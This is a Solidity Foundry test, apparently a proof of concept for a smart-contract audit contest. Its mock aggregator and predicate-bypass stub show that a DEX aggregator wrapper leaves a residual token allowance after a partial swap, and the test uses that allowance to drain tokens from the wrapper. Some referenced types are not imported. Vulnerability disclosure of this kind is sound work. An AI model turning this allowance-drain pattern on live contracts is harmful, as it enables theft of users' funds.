// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@solmate/tokens/ERC20.sol";
import {WETH} from "@solmate/tokens/WETH.sol";
import {DexAggregatorWrapperWithPredicateProxy} from "src/DexAggregatorWrapperWithPredicateProxy.sol";
import {AggregationRouterV6} from "attackathon/src/interfaces/AggregationRouterV6.sol";

interface IOKXRouter {}

contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s, uint8 d) ERC20(n, s, d) {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract MockAggregator is AggregationRouterV6 {
    uint256 public spendFractionBps;
    address public thief;
    function setSpendFractionBps(uint256 bps) external { spendFractionBps = bps; }
    function setThief(address t) external { thief = t; }
    function steal(ERC20 token, address from, uint256 amount) external {
        token.transferFrom(from, thief, amount);
    }
    function swap(address, SwapDescription calldata desc, bytes calldata)
        external
        payable
        override
        returns (uint256 returnAmount, uint256 spentAmount)
    {
        uint256 bps = spendFractionBps == 0 ? 10_000 : spendFractionBps;
        uint256 toSpend = (desc.amount * bps) / 10_000;
        desc.srcToken.transferFrom(msg.sender, address(this), toSpend);
        return (toSpend, toSpend);
    }
}

struct PredicateMessage { bytes data; }

contract MockPredicateBypass {
    function genericUserCheckPredicate(address, PredicateMessage calldata) external pure returns (bool) { return true; }
}

contract MockTeller {
    address public vault;
    constructor(address v) { vault = v; }
    function deposit(ERC20, uint256, uint256) external returns (uint256) { return 0; }
}

contract AllowancePoCTest is Test {
    MockERC20 src;
    MockERC20 vaultToken;
    WETH weth;
    MockAggregator agg;
    DexAggregatorWrapperWithPredicateProxy wrapper;

    function setUp() public {
        src = new MockERC20("SRC","SRC",18);
        vaultToken = new MockERC20("SHARE","SHARE",18);
        weth = new WETH();
        agg = new MockAggregator();
        MockPredicateBypass pred = new MockPredicateBypass();
        wrapper = new DexAggregatorWrapperWithPredicateProxy(
            AggregationRouterV6(address(agg)),
            IOKXRouter(address(0)),
            address(0),
            weth,
            // unsafe cast: wrapper only calls genericUserCheckPredicate
            TellerWithMultiAssetSupportPredicateProxy(payable(address(pred)))
        );
        src.mint(address(this), 1_000 ether);
        agg.setSpendFractionBps(5000);
        agg.setThief(address(this));
    }

    function _desc(uint256 amount) internal view returns (AggregationRouterV6.SwapDescription memory d) {
        d = AggregationRouterV6.SwapDescription({
            srcToken: src,
            dstToken: vaultToken,
            srcReceiver: payable(address(0)),
            dstReceiver: payable(address(wrapper)),
            amount: amount,
            minReturnAmount: 0,
            flags: 0
        });
    }

    function test_residual_allowance_drain() public {
        AggregationRouterV6.SwapDescription memory d = _desc(100 ether);
        bytes memory data;
        PredicateMessage memory pm;
        src.approve(address(wrapper), type(uint256).max);
        // pass a dummy teller that returns vault addr
        MockTeller teller = new MockTeller(address(vaultToken));
        // call; aggregator will spend 50, leaving 50 allowance
        wrapper.depositOneInch(vaultToken, TellerWithMultiAssetSupport(address(teller)), 0, address(0x1), d, data, 0, pm);
        uint256 beforeBal = src.balanceOf(address(wrapper));
        agg.steal(src, address(wrapper), 50 ether);
        uint256 afterBal = src.balanceOf(address(wrapper));
        assertLt(afterBal, beforeBal, "residual allowance allowed drain");
    }
}